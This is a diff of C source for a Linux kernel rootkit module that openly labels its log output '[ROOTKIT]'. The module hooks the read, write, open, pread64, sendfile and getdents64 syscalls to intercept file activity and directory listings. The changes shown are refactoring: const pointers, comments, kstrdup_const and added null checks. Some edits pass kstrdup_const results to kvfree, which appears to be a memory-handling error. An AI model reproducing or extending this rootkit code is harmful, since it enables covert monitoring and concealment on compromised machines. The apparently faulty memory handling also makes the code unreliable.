@@ -54,10 +54,10 @@ static __exit void rootkit_exit(void)
 SYSCALL_HOOK_HANDLER3(read, orig_read, p_regs, unsigned int, ui32_fd, char __user *, s_buf, size_t,
                       sz_count)
 {
-    long l_err       = 0;
-    long l_ret       = 0;
-    char *s_data     = NULL;
-    char *s_pathname = NULL;
+    long l_err             = 0;    // Error code of the copy functions
+    long l_ret             = 0;    // Return value of the real syscall
+    char *s_data           = NULL; // Data read from the user
+    const char *s_pathname = NULL; // Pathname of the file
 
     pr_info("[ROOTKIT] read(%u, %p, %zu)", ui32_fd, s_buf, sz_count);
 
@@ -66,7 +66,7 @@ SYSCALL_HOOK_HANDLER3(read, orig_read, p_regs, unsigned int, ui32_fd, char __use
 
     s_pathname = fd_get_pathname(ui32_fd);
     if (IS_ERR_OR_NULL(s_pathname)) {
-        s_pathname = kstrdup("(error)", GFP_KERNEL);
+        s_pathname = kstrdup_const("(error)", GFP_KERNEL);
     }
     pr_info("[ROOTKIT] * File name: %s\n", s_pathname);
     kvfree(s_pathname);
@@ -95,10 +95,10 @@ SYSCALL_HOOK_HANDLER3(read, orig_read, p_regs, unsigned int, ui32_fd, char __use
 SYSCALL_HOOK_HANDLER3(write, orig_write, p_regs, unsigned int, ui32_fd, const char __user *, s_buf,
                       size_t, sz_count)
 {
-    long l_err       = 0;
-    long l_ret       = 0;
-    char *s_data     = NULL;
-    char *s_pathname = NULL;
+    long l_err             = 0;    // Error code of the copy functions
+    long l_ret             = 0;    // Return value of the real syscall
+    char *s_data           = NULL; // Data written to the user
+    const char *s_pathname = NULL; // Pathname of the file
 
     pr_info("[ROOTKIT] write(%u, %p, %zu)", ui32_fd, s_buf, sz_count);
 
@@ -107,7 +107,7 @@ SYSCALL_HOOK_HANDLER3(write, orig_write, p_regs, unsigned int, ui32_fd, const ch
 
     s_pathname = fd_get_pathname(ui32_fd);
     if (IS_ERR_OR_NULL(s_pathname)) {
-        s_pathname = kstrdup("(error)", GFP_KERNEL);
+        s_pathname = kstrdup_const("(error)", GFP_KERNEL);
     }
     pr_info("[ROOTKIT] * File name: %s\n", s_pathname);
     kvfree(s_pathname);
@@ -136,8 +136,8 @@ SYSCALL_HOOK_HANDLER3(write, orig_write, p_regs, unsigned int, ui32_fd, const ch
 SYSCALL_HOOK_HANDLER3(open, orig_open, p_regs, const char __user *, s_filename, int, i32_flags,
                       umode_t, ui16_mode)
 {
-    long l_ret         = 0;
-    char *s_filename_k = NULL;
+    long l_ret               = 0;    // Return value of the real syscall
+    const char *s_filename_k = NULL; // Name of the file
 
     l_ret = orig_open(p_regs);
 
@@ -146,7 +146,7 @@ SYSCALL_HOOK_HANDLER3(open, orig_open, p_regs, const char __user *, s_filename, 
     if (IS_ERR_OR_NULL(s_filename_k)) {
         pr_err("[ROOTKIT] * Could not copy filename from user\n");
         // strncpy(s_filename_k, "(unknown)", PATH_MAX);
-        s_filename_k = kstrdup("(unknown)", GFP_KERNEL);
+        s_filename_k = kstrdup_const("(unknown)", GFP_KERNEL);
     }
 
     pr_info("[ROOTKIT] open(\"%s\", %#x, 0%ho) = %ld\n", s_filename_k, i32_flags, ui16_mode, l_ret);
@@ -160,10 +160,10 @@ SYSCALL_HOOK_HANDLER3(open, orig_open, p_regs, const char __user *, s_filename, 
 SYSCALL_HOOK_HANDLER4(pread64, orig_pread64, p_regs, unsigned int, ui32_fd, char __user *, s_buf,
                       size_t, sz_count, loff_t, i64_pos)
 {
-    long l_err       = 0;
-    long l_ret       = 0;
-    char *s_data     = NULL;
-    char *s_pathname = NULL;
+    long l_err             = 0;    // Error code of the copy functions
+    long l_ret             = 0;    // Return value of the real syscall
+    char *s_data           = NULL; // Data read from the user
+    const char *s_pathname = NULL; // Pathname of the file
 
     pr_info("[ROOTKIT] pread64(%u, %p, %zu, %lld)", ui32_fd, s_buf, sz_count, i64_pos);
 
@@ -172,7 +172,7 @@ SYSCALL_HOOK_HANDLER4(pread64, orig_pread64, p_regs, unsigned int, ui32_fd, char
 
     s_pathname = fd_get_pathname(ui32_fd);
     if (IS_ERR_OR_NULL(s_pathname)) {
-        s_pathname = kstrdup("(error)", GFP_KERNEL);
+        s_pathname = kstrdup_const("(error)", GFP_KERNEL);
     }
     pr_info("[ROOTKIT] * File name: %s\n", s_pathname);
     kvfree(s_pathname);
@@ -201,9 +201,9 @@ SYSCALL_HOOK_HANDLER4(pread64, orig_pread64, p_regs, unsigned int, ui32_fd, char
 SYSCALL_HOOK_HANDLER4(sendfile, orig_sendfile, p_regs, int, i32_out_fd, int, i32_in_fd,
                       loff_t __user *, p_offset, size_t, sz_count)
 {
-    long l_ret           = 0;
-    char *s_pathname_in  = NULL;
-    char *s_pathname_out = NULL;
+    long l_ret                 = 0;    // Return value of the real syscall
+    const char *s_pathname_in  = NULL; // Pathname of the input file
+    const char *s_pathname_out = NULL; // Pathname of the output file
 
     pr_info("[ROOTKIT] sendfile(%d, %d, %p, %zu)", i32_out_fd, i32_in_fd, p_offset, sz_count);
 
@@ -212,6 +212,12 @@ SYSCALL_HOOK_HANDLER4(sendfile, orig_sendfile, p_regs, int, i32_out_fd, int, i32
 
     s_pathname_in  = fd_get_pathname(i32_in_fd);
     s_pathname_out = fd_get_pathname(i32_out_fd);
+    if (IS_ERR_OR_NULL(s_pathname_in)) {
+        s_pathname_in = kstrdup_const("(error)", GFP_KERNEL);
+    }
+    if (IS_ERR_OR_NULL(s_pathname_out)) {
+        s_pathname_out = kstrdup_const("(error)", GFP_KERNEL);
+    }
     pr_info("[ROOTKIT] *  In file name: %s\n", s_pathname_in);
     pr_info("[ROOTKIT] * Out file name: %s\n", s_pathname_out);
 
@@ -238,7 +244,7 @@ SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd
     long l_err               = 0;    // Error code of the copy functions
     long l_move_len          = 0;    // Length of the data to move
     unsigned short us_reclen = 0;    // Length of the current directory entry
-    char *s_pathname         = NULL; // Pathname of the directory
+    const char *s_pathname   = NULL; // Pathname of the directory
 
     dirent64_t *p_dirent_k    = NULL; // Kernel buffer for directory entry array
     dirent64_t *p_dirent_k_it = NULL; // Directory entry array iterator
@@ -250,7 +256,7 @@ SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd
 
     s_pathname = fd_get_pathname(ui32_fd);
     if (IS_ERR_OR_NULL(s_pathname)) {
-        s_pathname = kstrdup("(error)", GFP_KERNEL);
+        s_pathname = kstrdup_const("(error)", GFP_KERNEL);
     }
     pr_info("[ROOTKIT] * Directory name: %s\n", s_pathname);
     kvfree(s_pathname);
